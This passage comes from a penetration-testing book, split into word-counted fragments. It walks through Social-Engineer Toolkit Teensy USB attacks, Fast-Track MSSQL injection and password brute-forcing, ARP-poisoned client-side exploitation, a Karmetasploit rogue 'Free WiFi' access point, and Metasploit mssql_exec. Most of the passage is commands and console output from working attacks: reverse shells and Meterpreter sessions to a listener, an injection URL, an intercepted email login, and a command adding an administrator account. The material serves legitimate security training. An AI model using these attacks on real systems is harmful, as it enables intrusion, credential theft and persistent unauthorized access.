[*] PDE file created. You can get it under 'reports/teensy.pde'
[*] Be sure to select "Tools", "Board", and "Teensy 2.0 (USB/KEYBOARD)" in Arduino
Press enter to continue.
[Word Count: 27]

[*] Launching MSF Listener...
resource (src/program_junk/meta_config)> exploit -j
[*] Exploit running as background job.
msf exploit(handler) >
[*] Started reverse handler on 0.0.0.0:443
[*] Starting the payload handler...
[Word Count: 28]

To begin setting up this attack, choose Teensy USB HID Attack Vector X 
from the main menu, and then choose WSCRIPT HTTP GET MSF Payload Y. Then 
tell SET to set up a payload and listener Z, selecting the default Meterpreter 
payload [ and encoding method \.
[Word Count: 47]

Figure 10-7: Setting up the Teensy device
[Word Count: 7]

After you have this selected, drag your .pde file into the Arduino inter-
face. Insert your USB device into the computer and upload your code. This 
will program your device with the SET-generated code. Figure 10-8 shows the 
code being uploaded.
After the programmed USB device is inserted into the target’s machine 
and the code is installed, you should see a Meterpreter shell:
[Word Count: 63]

[*] Sending stage (748544 bytes) to 172.16.32.131
[*] Meterpreter session 1 opened (172.16.32.129:443 -> 172.16.32.131:1333) at 
Thu June 09 12:52:32 -0400 2010
[*] Session ID 1 (172.16.32.129:443 -> 172.16.32.131:1333) processing 
InitialAutoRunScript 'migrate -f'
[*] Current server process: java.exe (824)
[*] Spawning a notepad.exe host process...
[*] Migrating into process ID 3044
[*] New server process: notepad.exe (3044)
[Word Count: 57]

attacks through a web interface. The wireless attack vector creates a rogue 
access point on the attacking machine. When the target connects to the access 
point, any website he visits is redirected to the attacker machine, which can 
then launch a number of SET attacks (such as harvester or the Java applet) 
on the target.
[Word Count: 55]

Fast-Track is an open source Python-based tool for 
augmenting advanced penetration testing techniques. 
Fast-Track uses the Metasploit Framework for payload 
delivery and client-side attack vectors. It complements 
Metasploit by adding additional features, including 
Microsoft SQL attacks, more exploits, and browser 
attack vectors. Fast-Track was created by Dave Kennedy, 
with contributions from Andrew Weidenhamer, John 
Melvin, and Scott White. It is currently updated and 
maintained by Joey Furr (j0fer).
[Word Count: 68]

Fast-Track’s interactive mode is the way to use it. To enter interactive 
mode, as shown below, use ./fast-track.py -i (which is similar to the com-
mand used by SET). By issuing different options and sequences, you can cus-
tomize your attack, targets, and more. (You can also use ./fast-track.py –g 
to load the web interface.)
[Word Count: 55]

You can see the general categories of attacks and features in Fast-Track’s 
main menu above though we’ll only cover selected ones in this chapter. 
We’ll explore some of the most useful tricks, with an emphasis on exploiting 
Microsoft SQL. For example, the Autopwn Automation menu simplifies the 
process of Metasploit’s autopwn functionality—simply enter the IP address, 
and Fast-Track sets up everything for you. The Exploits menu contains addi-
tional exploits not included in Metasploit.
[Word Count: 74]

SQL injection (SQLi) attacks piggyback SQL commands to assault web applica-
tions by exploiting insecure code. A SQL query can be inserted into the back-
end database via a trusted web server to execute commands on the database. 
Fast-Track automates the process of performing advanced SQL injection
[Word Count: 47]

attacks by focusing on query string and POST parameters within web applica-
tions. The following attack relies on the attacker knowing that SQL injection 
is present on the target website, and also knowing which parameter is vulner-
able. This attack will work only on MS SQL–based systems.
[Word Count: 47]

Begin the setup for the attack by selecting Microsoft SQL Tools from the main 
menu and then MSSQL Injector X, as shown below.
[Word Count: 23]

X 1. MSSQL Injector
2. MSSQL Bruter
3. SQLPwnage
[Word Count: 9]

The simplest form of SQL injection is within the query string, typically 
sent in the URL field from the browser to the server. This URL string can 
often contain parameters that inform a dynamic site what information is 
being requested. Fast-Track distinguishes which field to attack by inserting 
an 'INJECTHERE into the vulnerable query string parameter, like this:
[Word Count: 58]

http://www.secmaniac.com/index.asp?id='INJECTHERE&date=2011
[Word Count: 1]

When Fast-Track starts to exploit this vulnerability, it will look for the 
id string in all fields to determine which field to attack. Let’s look at this in 
action by selecting the first option, Query String Parameter Attack.
[Word Count: 38]

Enter which SQL Injector you want to use
[Word Count: 8]

X 1. SQL Injector - Query String Parameter Attack
2. SQL Injector - POST Parameter Attack
3. SQL Injector - GET FTP Payload Attack
4. SQL Injector - GET Manual Setup Binary Payload Attack
[Word Count: 34]

Enter the URL of the susceptible site, remember to put 'INJECTHERE for the 
injectable parameter
[Word Count: 15]

Example:http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah
[Word Count: 1]

Y Enter here: http://www.secmaniac.com/index.asp?id='INJECTHERE&date=2011
Sending initial request to enable xp_cmdshell if disabled...
Sending first portion of payload (1/4)...
Sending second portion of payload (2/4)...
Sending third portion of payload (3/4)...
Sending the last portion of the payload (4/4)...
[Word Count: 38]

Running cleanup before executing the payload...
Running the payload on the server...Sending initial request to enable 
xp_cmdshell if disabled...
Sending first portion of payload (1/4)...
Sending second portion of payload (2/4)...
Sending third portion of payload (3/4)...
Sending the last portion of the payload (4/4)...
Running cleanup before executing the payload...
Running the payload on the server...
listening on [any] 4444 ...
connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1041
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.
[Word Count: 78]

Success! Full access was granted to the system, all through SQL injection.
Note that this attack will not succeed if parameterized SQL queries or 
stored procedures are in use. Note, too, that the required configuration 
for this attack is very minimal. After selecting SQL Injector - Query String 
Parameter Attack X from the menu of attacks, you simply direct Fast-Track to 
the point of SQL injection Y. If the xp_cmdshell stored procedure is disabled, 
Fast-Track will automatically re-enable it and attempt privilege escalation of 
MS SQL.
[Word Count: 86]

Fast-Track’s POST parameter attack requires even less configuration than 
the preceding query string parameter attack. For this attack, simply pass Fast-
Track the URL of the website you want to attack, and it will automatically 
detect the form to attack.
[Word Count: 40]

Enter which SQL Injector you want to use
[Word Count: 8]

1. SQL Injector - Query String Parameter Attack
2. SQL Injector - POST Parameter Attack
3. SQL Injector - GET FTP Payload Attack
4. SQL Injector - GET Manual Setup Binary Payload Attack
[Word Count: 33]

This portion allows you to attack all forms on a specific website without having to specify
each parameter. Just type the URL in, and Fast-Track will auto SQL inject to each parameter
looking for both error based injection as well as blind based SQL injection. Simply type
the website you want to attack, and let it roll.
[Word Count: 57]

Example: http://www.sqlinjectablesite.com/index.aspx
[Word Count: 2]

Enter the URL to attack: http://www.secmaniac.com
[Word Count: 6]

Forms detected...attacking the parameters in hopes of exploiting SQL Injection..
[Word Count: 10]

Sending payload to parameter: txtPassword
[Word Count: 5]

[-] The PAYLOAD is being delivered. This can take up to two minutes. [-]
[Word Count: 14]

listening on [any] 4444 ...
connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1041
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.
[Word Count: 21]

As you can see, Fast-Track handled the automatic detection of the POST 
parameters and injected the attack, completely compromising the affected 
system via SQL injection.
[Word Count: 25]

NOTE
You can also use FTP to deliver your payload, although FTP is generally blocked on 
outbound-based connections.
[Word Count: 18]

If you have a different IP address listening for the reverse shell or you need 
to fine-tune some of the configuration settings, you can set up the injector 
manually.
[Word Count: 29]

Enter which SQL Injector you want to use
[Word Count: 8]

1. SQL Injector - Query String Parameter Attack
2. SQL Injector - POST Parameter Attack
3. SQL Injector - GET FTP Payload Attack
X 4. SQL Injector - GET Manual Setup Binary Payload Attack
[Word Count: 34]

The manual portion allows you to customize your attack for whatever reason.
[Word Count: 12]

You will need to designate where in the URL the SQL Injection is by using 
'INJECTHERE
[Word Count: 16]

So for example, when the tool asks you for the SQL Injectable URL, type:
[Word Count: 14]

http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah
[Word Count: 1]

Enter the URL of the susceptible site, remember to put 'INJECTHERE for the 
injectible parameter
[Word Count: 15]

Example: http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah
[Word Count: 2]

Y Enter here: http://www.secmaniac.com/index.asp?id='INJECTHERE&date=2010
Z Enter the IP Address of server with NetCat Listening: 10.211.55.130
[ Enter Port number with NetCat listening: 9090
[Word Count: 23]

Sending initial request to enable xp_cmdshell if disabled....
Sending first portion of payload....
Sending second portion of payload....
Sending next portion of payload...
Sending the last portion of the payload...
Running cleanup...
Running the payload on the server...
listening on [any] 9090 ...
10.211.55.128: inverse host lookup failed: Unknown server error : Connection 
timed out
connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1045
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.
[Word Count: 71]

First choose the manual option at X. Then, as in the query string param-
eter attack, point Fast-Track to the parameter vulnerable to SQL injection Y 
and input your listening IP address at Z along with the port you want your 
target to connect to at [. Fast-Track takes care of the rest.
[Word Count: 53]

1. MSSQL Injector
2. MSSQL Bruter
3. SQLPwnage
[Word Count: 8]

Enter the IP Address and Port Number to Attack.
[Word Count: 9]

Options: (a)ttempt SQL Ping and Auto Quick Brute Force
           (m)ass scan and dictionary brute
           (s)ingle Target (Attack a Single Target with big dictionary)
           (f)ind SQL Ports (SQL Ping)
           (i) want a command prompt and know which system is vulnerable
           (v)ulnerable system, I want to add a local admin on the box...
           
(e)nable xp_cmdshell if its disabled (sql2k and sql2k5)
[Word Count: 59]

After we select the MSSQL Bruter option, Fast-Track presents us with a list 
of various attacks that can be conducted. Not all of these will work in every 
situation, or even serve the same purpose, so it is important to be sure that 
you understand what is happening for each option.
Fast-Track has several options:
[Word Count: 55]

z
Attempt SQL Ping and Auto Quick Brute Force attempts to scan a range 
of IP addresses using the same syntax as nmap and a built-in predefined 
dictionary list of about 50 passwords.
[Word Count: 33]

z
Mass scan and dictionary brute scans a range of IP addresses and allows 
you to specify a word list of your own. Fast-Track comes with a decent 
word list located at bin/dict/wordlist.txt.
[Word Count: 33]

z
Single Target allows you to brute force one specific IP address with a 
large word list.
[Word Count: 17]

z
Find SQL Ports (SQL Ping) only looks for SQL servers and will not 
attack them.
[Word Count: 16]

z
I want a command prompt . . . spawns a command prompt for you if you 
already know the sa password.
[Word Count: 22]

z
Vulnerable system . . . adds a new administrative user on a box that you 
know to be vulnerable.
[Word Count: 20]

z
Enable xp_cmdshell . . . is a stored procedure Fast-Track uses to execute 
underlying system commands. By default, it is disabled in SQL Server 
versions 2005 and later, but Fast-Track can automatically re-enable it. 
When attacking a remote system with any option, Fast-Track will auto-
matically attempt to re-enable xp_cmdshell, just in case.
[Word Count: 54]

You can use and customize several options to reach your target, the easi-
est of which is the quick brute force, which will often go undetected. We’ll 
select the quick brute force option using a subset of built-in passwords and 
attempt to guess the password on the MS SQL server.
[Word Count: 50]

Enter the IP Address and Port Number to Attack.
[Word Count: 9]

X 
Options: (a)ttempt SQL Ping and Auto Quick Brute Force
           (m)ass scan and dictionary brute
           (s)ingle Target (Attack a Single Target with big dictionary)
           (f)ind SQL Ports (SQL Ping)
           (i) want a command prompt and know which system is vulnerable
           (v)ulnerable system, I want to add a local admin on the box...
           (e)nable xp_cmdshell if its disabled (sql2k and sql2k5)
[Word Count: 60]

Enter Option: a
Y Enter username for SQL database (example:sa): sa
Configuration file not detected, running default path.
Recommend running setup.py install to configure Fast-Track.
Setting default directory...
Z Enter the IP Range to scan for SQL Scan (example 192.168.1.1-255): 
10.211.55.1/24
[Word Count: 41]

Do you want to perform advanced SQL server identification on non-standard SQL 
ports? This will use UDP footprinting in order to determine where the SQL 
servers are at. This could take quite a long time.
[Word Count: 35]

[ Do you want to perform advanced identification, yes or no: yes
[Word Count: 12]

[-] Launching SQL Ping, this may take a while to footprint.... [-]
[Word Count: 12]

[*] Please wait while we load the module tree...
Brute forcing username: sa
[Word Count: 13]

Brute forcing password of password2 on IP 10.211.55.128:1433
Brute forcing password of  on IP 10.211.55.128:1433
Brute forcing password of password on IP 10.211.55.128:1433
[Word Count: 23]

SQL Server Compromised: "sa" with password of: "password" on IP 
10.211.55.128:1433
[Word Count: 11]

Brute forcing password of sqlserver on IP 10.211.55.128:1433
Brute forcing password of sql on IP 10.211.55.128:1433
Brute forcing password of password1 on IP 10.211.55.128:1433
Brute forcing password of password123 on IP 10.211.55.128:1433
Brute forcing password of complexpassword on IP 10.211.55.128:1433
Brute forcing password of database on IP 10.211.55.128:1433
Brute forcing password of server on IP 10.211.55.128:1433
Brute forcing password of changeme on IP 10.211.55.128:1433
Brute forcing password of change on IP 10.211.55.128:1433
Brute forcing password of sqlserver2000 on IP 10.211.55.128:1433
Brute forcing password of sqlserver2005 on IP 10.211.55.128:1433
[Word Count: 88]

Brute forcing password of Sqlserver on IP 10.211.55.128:1433
Brute forcing password of SqlServer on IP 10.211.55.128:1433
Brute forcing password of Password1 on IP 10.211.55.128:1433
[Word Count: 24]

*******************************************
The following SQL Servers were compromised:
*******************************************
[Word Count: 8]

1. 10.211.55.128:1433 *** U/N: sa P/W: password ***
[Word Count: 8]

*******************************************
[Word Count: 1]

To interact with system, enter the SQL Server number.
[Word Count: 9]

Example: 1. 192.168.1.32 you would type 1
[Word Count: 7]

After selecting Attempt SQL Ping and Auto Quick Brute Force at X, you 
will be prompted for a SQL database username Y, followed by the range of 
IP addresses you want to scan at Z. Answer yes when asked whether you want 
to perform advanced server identification [. Although slow, this can be very 
effective.
The preceding output shows that Fast-Track successfully brute forced a 
system with the username of sa and password password. At this point, you can 
select the payload and compromise the system, as shown here.
[Word Count: 89]

Enabling: XP_Cmdshell...
Finished trying to re-enable xp_cmdshell stored procedure if disabled.
[Word Count: 11]

[*] Transmitting intermediate stager for over-sized stage...(216 bytes)
[*] Sending stage (718336 bytes)
[*] Meterpreter session 1 opened (10.211.55.130:4444 -> 10.211.55.128:1030)
[Word Count: 21]

You should now have full access to the machine using the Meterpreter 
payload.
[Word Count: 13]

1. SQL Injection Search/Exploit by Binary Payload Injection (BLIND)
X 2. SQL Injection Search/Exploit by Binary Payload Injection (ERROR BASED)
3. SQL Injection single URL exploitation
[Word Count: 26]

1. url
Y 2. subnet (new)
3. subnet (lists last scan)
[Word Count: 11]

Enter the ip range, example 192.168.1.1-254: 10.211.55.1-254
Scanning Complete!!! Select a website to spider or spider all??
[Word Count: 17]

Attempting to Spider: http://10.211.55.128
Crawling http://10.211.55.128 (Max Depth: 100000)
DONE
Found 0 links, following 0 urls in 0+0:0:0
[Word Count: 18]

*************************************************************************
http://10.211.55.128
*************************************************************************
[Word Count: 3]

[ A SQL Exception has been encountered in the "txtLogin" input field of the
[Word Count: 14]

1. Custom Packed Fast-Track Reverse Payload (AV Safe)
2. Metasploit Reverse VNC Inject (Requires Metasploit)
3. Metasploit Meterpreter Payload (Requires Metasploit)
4. Metasploit TCP Bind Shell (Requires Metasploit)
5. Metasploit Meterpreter Reflective Reverse TCP
6. Metasploit Reflective Reverse VNC
[Word Count: 39]

Running cleanup before launching the payload....
[+] Launching the PAYLOAD!! This may take up to two or three minutes. [+]
[*] Please wait while we load the module tree...
[*] Handler binding to LHOST 0.0.0.0
[*] Started reverse handler
[*] Starting the payload handler...
[*] Transmitting intermediate stager for over-sized stage...(216 bytes)
[*] Sending stage (2650 bytes)
[*] Sleeping before handling stage...
[*] Uploading DLL (718347 bytes)...
[*] Upload completed.
[ [*] Meterpreter session 1 opened (10.211.55.130:9090 -> 10.211.55.128:1031)
[Word Count: 79]

The binary-to-hex generator is useful when you already have access to a sys-
tem and you want to deliver an executable to the remote file system. Point 
Fast-Track to the executable, and it will generate a text file that you can copy 
and paste to the target operating system. To convert the hexadecimal back to 
a binary and execute it, choose option 6 as shown at X below.
[Word Count: 68]

X Enter the number: 6
Binary to Hex Generator v0.1
[Word Count: 10]

Y Enter the path to the file you want to convert to hex: /pentest/exploits/
fasttrack/nc.exe
[Word Count: 15]

After selecting the Binary to Hex Payload Converter, point Fast-Track to the 
binary you want to convert at Y and wait for the magic. At this point, you can 
simply copy and paste the output from Z into an existing shell window.
[Word Count: 42]

The mass client-side attack is similar to the Browser Autopwn function; however, 
this attack includes additional exploits and built-in features that can incorpo-
rate ARP cache and DNS poisoning on the target’s machine, and additional 
browser exploits not included in Metasploit.
When a user connects to your web server, Fast-Track will fire off every 
exploit in its arsenal as well as those in the Metasploit Framework. If the 
user’s machine is susceptible to a specific vulnerability within one of these 
libraries, the attacker will obtain full access to the target machine.
[Word Count: 91]

Y Enter the IP Address you want the web server to listen on: 10.211.55.130
[Word Count: 14]

1. Windows Meterpreter Reverse Meterpreter
2. Generic Bind Shell
3. Windows VNC Inject Reverse_TCP (aka "Da Gui")
4. Reverse TCP Shell
[Word Count: 21]

Z Enter the number of the payload you want: 1
[Word Count: 10]

After selecting option 4, Mass Client-Side Attack X, from the main menu, 
tell Fast-Track what IP address the web server should listen on Y, and then 
choose a payload Z.
Next, decide whether to use Ettercap to ARP-poison your target machine. 
Ettercap will intercept all requests that the target makes and redirect them to 
your malicious server. After confirming that you want to use Ettercap at X, 
enter the IP address of the target you want to poison Y. Fast-Track will then 
go ahead and set up Ettercap Z for you.
[Word Count: 91]

X Would you like to use Ettercap to ARP poison a host yes or no: yes
[Word Count: 16]

Y What IP Address do you want to poison: 10.211.55.128
Setting up the ettercap filters....
Filter created...
Compiling Ettercap filter...
[Word Count: 20]

Z Filter compiled...Running Ettercap and poisoning target...
[Word Count: 7]

Once a client connects to your malicious server, Metasploit fires exploits X 
at the target. In the following listing, you can see that the Adobe exploit is 
successful, and a Meterpreter shell is waiting Y.
[Word Count: 35]

NOTE
You could use ARP cache poisoning within this attack, but it will only work when you 
are on the same local and unrestricted subnet as the target.
[Word Count: 28]

Id Description Tunnel 
-- ----------- ------ 
1 Meterpreter 10.211.55.130:9007 -> 10.211.55.128:1077
[Word Count: 11]

msf exploit(zenturiprogramchecker_unsafe) > sessions -i 1
[*] Starting interaction with 1...
[Word Count: 11]

Fast-Track offers a plethora of exploitation capabilities that expand upon the 
feature-rich Metasploit Framework. When coupled with Metasploit it will allow 
you to use advanced attack vectors to fully control a target machine. Of 
course, automated attack vectors do not always succeed, which is why you 
must understand the system you are performing the attack against and 
ensure that when you attack it, you know its chances of success. If an auto-
mated tool fails, your ability to perform the tests manually and successfully 
attack the target system will make you a better penetration tester.
[Word Count: 95]

Karmetasploit is Metasploit’s implementation of 
KARMA, a set of wireless security tools developed 
by Dino Dai Zovi and Shane Macaulay. KARMA takes 
advantage of a vulnerability inherent in the way Win-
dows XP and Mac OS X operating systems search 
for networks: When each system boots, it sends bea-
cons looking for networks to which it has connected 
previously.
[Word Count: 59]

Karmetasploit is the Metasploit Framework implementation of the 
KARMA attack. It implements various “evil” services including DNS, POP3, 
IMAP4, SMTP, FTP, SMB, and HTTP. These services accept and respond to 
most requests from clients and will serve up all kinds of malicious fun. (The 
various modules are in the modules/auxiliary/server directory of the Metasploit 
root directory.)
[Word Count: 56]

Karmetasploit requires very little configuration. To begin, we configure a 
DHCP server to be used to hand out IP addresses to wireless targets. Back|
Track includes a DHCP server, but we will need to create a custom configura-
tion file for it to use with Karmetasploit, as shown in the following listing:
[Word Count: 52]

X option domain-name-servers 10.0.0.1;
default-lease-time 60;
max-lease-time 72;
ddns-update-style none;
authoritative;
log-facility local7;
subnet 10.0.0.0 netmask 255.255.255.0 {
Y      range 10.0.0.100 10.0.0.254;
        option routers 10.0.0.1;
        option domain-name-servers 10.0.0.1;
}
[Word Count: 29]

We back up our original dhcpd.conf file by entering cp /etc/dhcp3/dhcpd.conf/
etc/dhcp3/dhcpd.conf.back, and then we create a new file containing the data 
shown at X, which will serve addresses in the range of 10.0.0.100 to 10.0.0.254 Y. 
(If you are unfamiliar with DHCP configurations, don’t worry; as long as your 
new dhcpd.conf looks similar to this it should work fine.)
Next, we download the KARMA resource file, because as of this writing 
it’s not included in the regular Metasploit trunk:
[Word Count: 80]

root@bt:/opt/metasploit3/msf3# wget http://www.offensive-security.com/downloads/karma.rc
[Word Count: 3]

When we open the KARMA resource file karma.rc, we can see the sequence 
of events that occur when it runs, as shown here:
[Word Count: 23]

root@bt:/opt/metasploit3/msf3# cat karma.rc
db_connect postgres:toor@127.0.0.1/msfbook 
X use auxiliary/server/browser_autopwn
Y setg AUTOPWN_HOST 10.0.0.1
setg AUTOPWN_PORT 55550
setg AUTOPWN_URI /ads
Z set LHOST 10.0.0.1
set LPORT 45000
[Word Count: 25]

set SRVPORT 55550
set URIPATH /ads
run
[ use auxiliary/server/capture/pop3
set SRVPORT 110
set SSL false
run
[Word Count: 17]

root@bt:/opt/metasploit3/msf3# airmon-ng start wlan0
[Word Count: 4]

NOTE
If your card uses a different chipset from the one used in this example, visit the 
Aircrack-ng website (http://www.aircrack-ng.org/) for specifics on how to place 
your card in monitor mode.
[Word Count: 31]

The airbase-ng component of the Aircrack-ng suite is used to create Karmeta-
sploit’s fake access point. In the next example, we configure the airbase-ng 
access point to respond to all probes (-P), to beacon every 30 seconds (-C 30) 
with the ESSID Free Wi-Fi (-e "Free WiFi"), and to be verbose (-v) using the 
interface mon0:
[Word Count: 56]

root@bt:/opt/metasploit3/msf3# airbase-ng -P -C 30 -e "Free WiFi" -v mon0
X 14:06:57  Created tap interface at0
14:06:57  Trying to set MTU on at0 to 1500
14:06:57  Trying to set MTU on mon0 to 1800
14:06:57  Access Point with BSSID 00:21:29:E2:DE:14 started.
[Word Count: 41]

As you can see at X, Airbase-ng creates a new interface called at0. Kar-
metasploit will use this interface.
[Word Count: 19]

Next, we turn on the at0 interface and start the DHCP server:
[Word Count: 12]

X root@bt:/opt/metasploit3/msf3# ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
Y root@bt:/opt/metasploit3/msf3# dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0
[Word Count: 14]

msf > resource karma.rc
resource (karma.rc)> db_connect postgres:toor@127.0.0.1/msfbook
resource (karma.rc)> use auxiliary/server/browser_autopwn
resource (karma.rc)> setg AUTOPWN_HOST 10.0.0.1
AUTOPWN_HOST => 10.0.0.1
resource (karma.rc)> setg AUTOPWN_PORT 55550
AUTOPWN_PORT => 55550
resource (karma.rc)> setg AUTOPWN_URI /ads
AUTOPWN_URI => /ads
X resource (karma.rc)> set LHOST 10.0.0.1
LHOST => 10.0.0.1
resource (karma.rc)> set LPORT 45000
LPORT => 45000
resource (karma.rc)> set SRVPORT 55550
SRVPORT => 55550
resource (karma.rc)> set URIPATH /ads
[Word Count: 66]

URIPATH => /ads
resource (karma.rc)> run
[*] Auxiliary module execution completed
Y resource (karma.rc)> use auxiliary/server/capture/pop3
resource (karma.rc)> set SRVPORT 110
SRVPORT => 110
resource (karma.rc)> set SSL false
SSL => false
resource (karma.rc)> run
[Word Count: 35]

Z [*] Starting exploit windows/browser/winzip_fileview with payload windows/
meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:55550/N9wReDJhfKg
[*] Local IP: http://192.168.1.101:55550/N9wReDJhfKg
[*] Server started.
[ [*] Starting handler for windows/meterpreter/reverse_tcp on port 3333
[*] Starting handler for generic/shell_reverse_tcp on port 6666
[*] Started reverse handler on 10.0.0.1:3333
[*] Starting the payload handler...
[*] Started reverse handler on 10.0.0.1:6666
[*] Starting the payload handler...
[*] --- Done, found 15 exploit modules
[*] Using URL: http://0.0.0.0:55550/ads
[*] Local IP: http://192.168.1.101:55550/ads
[*] Server started.
[Word Count: 77]

As you can see, a great deal is happening with the resource file. In this 
listing, the LHOST address is set to 10.0.0.1 at X, the POP3 service (among others) 
is started at Y, the autopwn exploits are loaded at Z, and payloads are config-
ured at [.
[Word Count: 48]

When a client connects to our malicious access point, the messages file we 
are tailing will show us when an IP address is handed out. This is our cue to 
switch back to msfconsole to see what is happening. Here, we see that a client 
connects and is assigned an IP address:
[Word Count: 52]

Apr  2 15:07:34 bt dhcpd: DHCPDISCOVER from 00:17:9a:b2:b1:6d via at0
Apr  2 15:07:35 bt dhcpd: DHCPOFFER on 10.0.0.100 to 00:17:9a:b2:b1:6d (v-xp-sp2-bare) via at0
Apr  2 15:07:35 bt dhcpd: DHCPREQUEST for 10.0.0.100 (10.0.0.1) from 00:17:9a:b2:b1:6d 
(v-xp-sp2-bare) via at0
Apr  2 15:07:35 bt dhcpd: DHCPACK on 10.0.0.100 to 00:17:9a:b2:b1:6d (v-xp-sp2-bare) via at0
[Word Count: 50]

The first thing our target does is open an email client. Karmetasploit is 
waiting, as shown here:
[Word Count: 17]

[*] DNS 10.0.0.100:1049 XID 45030 (IN::A time.windows.com)
[*] DNS 10.0.0.100:1049 XID 47591 (IN::A pop3.securemail.com)
X [*] POP3 LOGIN 10.0.0.100:1102 bsmith / s3cr3tp4s5
[Word Count: 22]

The POP3 server configured by Metasploit intercepts the target’s email 
username and password at X, because all DNS requests are intercepted by 
the DNS server that Karmetasploit set up for us.
[Word Count: 31]

At this point, the user has no new messages, so he decides to do some web 
browsing. When the browser opens, a captive portal is presented to the user, 
as shown in Figure 12-1.
[Word Count: 34]

Figure 12-1: Karmetasploit captive portal
[Word Count: 5]

[*] HTTP REQUEST 10.0.0.100 > www.microsoft.com:80 GET /isapi/redir.dll Windows IE 6.0 
cookies=WT_NVR=0=/:1=downloads:2=downloads/en; WT_FPC=id=111.222.333.444-1008969152
.30063513:lv=1267703430218:ss=1267703362203;MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&HASH=
d23f&LV=20103&V=3; A=I&I=AxUFAAAAAAAuBwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C864
18EBC913CE45C4326AE
[*] Request '/ads' from 10.0.0.100:1371
X [*] HTTP REQUEST 10.0.0.100 > adwords.google.com:80 GET /forms.html Windows IE 6.0 cookies=
[*] HTTP REQUEST 10.0.0.100 > blogger.com:80 GET /forms.html Windows IE 6.0 cookies=
[Word Count: 48]

[*] HTTP REQUEST 10.0.0.100 > care.com:80 GET /forms.html Windows IE 6.0 cookies=
[*] HTTP REQUEST 10.0.0.100 > careerbuilder.com:80 GET /forms.html Windows IE 6.0 cookies=
[*] HTTP REQUEST 10.0.0.100 > ecademy.com:80 GET /forms.html Windows IE 6.0 cookies=
[*] HTTP REQUEST 10.0.0.100 > facebook.com:80 GET /forms.html Windows IE 6.0 cookies=
[Word Count: 48]

[*] HTTP 10.0.0.100 attempted to download an ActiveX control
[*] HTTP REQUEST 10.0.0.100 > codecs.microsoft.com:80 POST /isapi/ocget.dll Windows IE 6.0 
cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=1267703362203; 
MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&HASH=d23f&LV=20103&V=3; A=I&I=AxUFAAAAAAAu
BwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE
[*] HTTP REQUEST 10.0.0.100 > codecs.microsoft.com:80 POST /isapi/ocget.dll Windows IE 6.0 
cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=1267703362203; 
MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&HASH=d23f&LV=20103&V=3; A=I&I=AxUFAAAAAAAu
BwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE
[*] HTTP REQUEST 10.0.0.100 > codecs.microsoft.com:80 POST /isapi/ocget.dll Windows IE 6.0 
cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=1267703362203; 
MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&HASH=d23f&LV=20103&V=3; A=I&I=AxUFAAAAAAAu
BwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE
[Word Count: 57]

[*] Sending EXE payload to 10.0.0.100:1371...
[*] Sending stage (748032 bytes) to 10.0.0.100
] [*] Meterpreter session 1 opened (10.0.0.1:3333 -> 10.0.0.100:1438)
[Word Count: 22]

meterpreter > sessions -i 1
[*] Starting interaction with 1...
meterpreter > sysinfo
Computer: V-XP-SP2-BARE
OS      : Windows XP (Build 2600, Service Pack 2).
Arch    : x86
Language: en_US
meterpreter > getuid
Server username: V-XP-SP2-BARE\Administrator
meterpreter > run migrate -f
[*] Current server process: jEFiwxBKyjoHGijtP.exe (3448)
[*] Spawning a notepad.exe host process...
[*] Migrating into process ID 2232
[*] New server process: notepad.exe (2232)
meterpreter > screenshot
Screenshot saved to: /opt/metasploit3/msf3/rkGrMLPa.jpeg
meterpreter >
[Word Count: 73]

Because this is a default installation of Windows XP SP2 with the very inse-
cure Internet Explorer 6 installed (both of which are highly out of date), the 
client didn’t even need to accept and install the malicious ActiveX control.
[Word Count: 40]

B U I L D I N G  Y O U R  O W N  M O D U L E
[Word Count: 21]

The ability to convert a binary to hexadecimal, transmit it via MS SQL, 
and convert it back to binary is an excellent example of how powerful the 
Metasploit Framework can be. As you’re performing penetration tests, you 
will encounter many unfamiliar scenarios or situations; your ability to create 
or modify modules and exploits on the fly will give you that needed edge. As 
you begin to understand the Framework, you’ll be able to write these types of 
modules in a relatively short amount of time.
[Word Count: 85]

Getting Command Execution on Microsoft SQL
[Word Count: 6]

NOTE
MS SQL installs with this stored procedure disabled in SQL Server 2005 and 2008, 
but you can re-enable it using SQL commands if you have the sysadmin role within 
MS SQL. For example, you could use SELECT loginname FROM master..syslogins 
WHERE sysadmin=1 to view all users with this level of access and then become one of those 
users. If you have the sysadmin role, you’re almost guaranteed a full-system compromise.
[Word Count: 71]

The following listing demonstrates how to run basic commands through 
Metasploit’s MS SQL modules:
[Word Count: 14]

X use msf > use admin/mssql/mssql_exec
Y msf auxiliary(mssql_exec) > show options
[Word Count: 12]

Name      Current Setting                       Required  Description
   ----      ---------------                       --------  -----------
   CMD       cmd.exe /c echo OWNED > C:\owned.exe  no        Command to execute
   PASSWORD
no
The password for the
specified username
   RHOST                                           yes       The target address
   RPORT     1433                                  yes       The target port
   USERNAME  sa                                    no        The username to authenticate as
[Word Count: 47]

Z msf auxiliary(mssql_exec) > set RHOST 172.16.32.136
RHOST => 172.16.32.136
[ msf auxiliary(mssql_exec) > set CMD net user metasploit p@55w0rd /ADD 
CMD => net user metasploit p@55w0rd /ADD
